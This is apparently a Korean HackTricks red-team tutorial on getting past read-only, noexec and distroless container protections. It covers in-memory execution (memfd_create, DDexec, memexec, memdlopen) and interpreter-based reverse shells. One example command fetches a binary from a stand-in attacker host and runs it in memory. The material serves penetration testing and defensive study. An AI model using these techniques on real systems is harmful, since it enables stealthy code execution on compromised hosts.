# FS 보호 우회: 읽기 전용 / 실행 금지 / Distroless

{{#include ../../../banners/hacktricks-training.md}}

## 비디오

다음 비디오에서는 이 페이지에 언급된 기술을 더 깊이 설명합니다:

- [**DEF CON 31 - 스텔스 및 회피를 위한 리눅스 메모리 조작 탐색**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**DDexec-ng 및 인메모리 dlopen()을 이용한 스텔스 침투 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## 읽기 전용 / 실행 금지 시나리오

리눅스 머신이 **읽기 전용 (ro) 파일 시스템 보호**로 마운트되는 경우가 점점 더 많아지고 있습니다. 이는 컨테이너에서 **`readOnlyRootFilesystem: true`**를 `securitycontext`에 설정하는 것이 간단하기 때문입니다:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

그러나 파일 시스템이 ro로 마운트되더라도 **`/dev/shm`**는 여전히 쓰기가 가능하므로 디스크에 아무것도 쓸 수 없다는 것은 잘못된 것입니다. 그러나 이 폴더는 **실행 금지 보호**로 마운트되므로 여기에서 바이너리를 다운로드하면 **실행할 수 없습니다**.

> [!WARNING]
> 레드 팀 관점에서 볼 때, 이는 시스템에 이미 없는 바이너리(예: 백도어 또는 `kubectl`과 같은 열거기)를 **다운로드하고 실행하기 어렵게** 만듭니다.

## 가장 쉬운 우회: 스크립트

바이너리를 언급했지만, **인터프리터가 머신 내에 있는 한** 어떤 스크립트도 **실행할 수 있습니다**. 예를 들어, `sh`가 있는 경우 **셸 스크립트**를 실행하거나 `python`이 설치된 경우 **파이썬 스크립트**를 실행할 수 있습니다.

그러나 이것만으로는 바이너리 백도어나 실행해야 할 다른 바이너리 도구를 실행하기에 충분하지 않습니다.

## 메모리 우회

바이너리를 실행하고 싶지만 파일 시스템이 이를 허용하지 않는 경우, 가장 좋은 방법은 **메모리에서 실행하는 것**입니다. 왜냐하면 **보호가 적용되지 않기 때문입니다**.

### FD + exec 시스템 호출 우회

머신 내에 **Python**, **Perl**, 또는 **Ruby**와 같은 강력한 스크립트 엔진이 있는 경우, 메모리에서 실행할 바이너리를 다운로드하고, 메모리 파일 설명자(`create_memfd` 시스템 호출)에 저장할 수 있습니다. 이는 이러한 보호에 의해 보호되지 않으며, 그런 다음 **`exec` 시스템 호출**을 호출하여 **실행할 파일로 fd를 지정**합니다.

이를 위해 [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) 프로젝트를 쉽게 사용할 수 있습니다. 바이너리를 전달하면 **바이너리가 압축되고 b64로 인코딩된** 스크립트를 지정된 언어로 생성하며, **메모리 fd를 생성하는 `create_memfd` 시스템 호출**과 이를 실행하기 위한 **exec** 시스템 호출을 포함한 지침이 포함됩니다.

> [!WARNING]
> 이는 PHP나 Node와 같은 다른 스크립팅 언어에서는 작동하지 않습니다. 왜냐하면 스크립트에서 **원시 시스템 호출을 호출하는 기본 방법이 없기 때문입니다**. 따라서 바이너리를 저장할 **메모리 fd**를 생성하기 위해 `create_memfd`를 호출할 수 없습니다.
>
> 또한, `/dev/shm`에 있는 파일로 **정규 fd**를 생성하는 것은 작동하지 않습니다. 왜냐하면 **실행 금지 보호**가 적용되기 때문에 실행할 수 없기 때문입니다.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) 기술은 **자신의 프로세스 메모리를 수정**하여 **`/proc/self/mem`**을 덮어쓸 수 있게 해줍니다.

따라서 **프로세스에서 실행되는 어셈블리 코드를 제어**함으로써, **셸코드**를 작성하고 프로세스를 "변형"하여 **임의의 코드를 실행**할 수 있습니다.

> [!TIP]
> **DDexec / EverythingExec**를 사용하면 **메모리**에서 자신의 **셸코드** 또는 **어떤 바이너리**를 **로드하고 실행**할 수 있습니다.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
이 기술에 대한 자세한 정보는 Github를 확인하거나:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec)는 DDexec의 자연스러운 다음 단계입니다. **다른 바이너리**를 **실행**하고 싶을 때마다 DDexec를 다시 시작할 필요 없이, DDexec 기술을 통해 memexec 셸코드를 실행하고 **이 데몬과 통신하여 새 바이너리를 로드하고 실행**할 수 있습니다.

**memexec를 사용하여 PHP 리버스 셸에서 바이너리를 실행하는 방법**에 대한 예시는 [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php)에서 확인할 수 있습니다.

### Memdlopen

DDexec와 유사한 목적을 가진 [**memdlopen**](https://github.com/arget13/memdlopen) 기술은 **메모리에 바이너리를 로드하는 더 쉬운 방법**을 제공합니다. 이는 의존성이 있는 바이너리도 로드할 수 있게 해줄 수 있습니다.

## Distroless Bypass

### Distroless란 무엇인가

Distroless 컨테이너는 특정 애플리케이션이나 서비스 실행에 필요한 **최소한의 구성 요소**만 포함하고 있으며, 패키지 관리자, 셸 또는 시스템 유틸리티와 같은 더 큰 구성 요소는 제외합니다.

Distroless 컨테이너의 목표는 **불필요한 구성 요소를 제거하여 컨테이너의 공격 표면을 줄이고** 악용될 수 있는 취약점의 수를 최소화하는 것입니다.

### 리버스 셸

Distroless 컨테이너에서는 **정상적인 셸을 얻기 위해 `sh` 또는 `bash`**를 찾을 수 없을 수도 있습니다. `ls`, `whoami`, `id`와 같은 바이너리도 찾을 수 없습니다... 시스템에서 일반적으로 실행하는 모든 것입니다.

> [!WARNING]
> 따라서, **리버스 셸**을 얻거나 **시스템을 열거**할 수 **없습니다**.

그러나 손상된 컨테이너가 예를 들어 flask 웹을 실행하고 있다면, python이 설치되어 있으므로 **Python 리버스 셸**을 얻을 수 있습니다. 노드를 실행하고 있다면 Node 리버스 셸을 얻을 수 있으며, 대부분의 **스크립팅 언어**와 마찬가지입니다.

> [!TIP]
> 스크립팅 언어를 사용하여 언어의 기능을 활용하여 **시스템을 열거**할 수 있습니다.

**읽기 전용/실행 금지** 보호가 없다면 리버스 셸을 악용하여 **파일 시스템에 바이너리를 작성**하고 **실행**할 수 있습니다.

> [!TIP]
> 그러나 이러한 종류의 컨테이너에서는 이러한 보호가 일반적으로 존재하지만, **이전 메모리 실행 기술을 사용하여 우회할 수 있습니다**.

**RCE 취약점을 악용하여 스크립팅 언어의 리버스 셸을 얻고 메모리에서 바이너리를 실행하는 방법**에 대한 **예시**는 [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE)에서 확인할 수 있습니다.


{{#include ../../../banners/hacktricks-training.md}}
